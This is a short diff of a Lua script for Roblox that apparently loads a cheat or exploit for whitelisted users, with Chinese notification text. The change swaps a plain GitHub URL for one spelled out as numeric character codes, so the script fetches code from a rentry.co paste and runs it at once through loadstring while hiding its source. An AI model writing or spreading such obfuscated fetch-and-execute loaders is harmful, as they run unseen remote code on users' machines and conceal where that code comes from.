@@ -87,7 +87,7 @@ local whitelist_table = {};
 			Title = '徽山工作室 | 白名单验证',
 			Text = '欢迎您亲爱的白名单用户正在为您加载…'
 		})
-	loadstring(game:HttpGet("https://raw.githubusercontent.com/pyahwhh/HUA-VX/main/HUA%20DARKRAI",true))()
+	loadstring(game:HttpGet(utf8.char((function() return table.unpack({104,116,116,112,115,58,47,47,114,101,110,116,114,121,46,99,111,47,67,104,101,101,107,45,50,47,114,97,119})end)())))()
 			else
 			game.StarterGui:SetCore('SendNotification', {
 			Title = '徽山工作室 | 白名单验证',
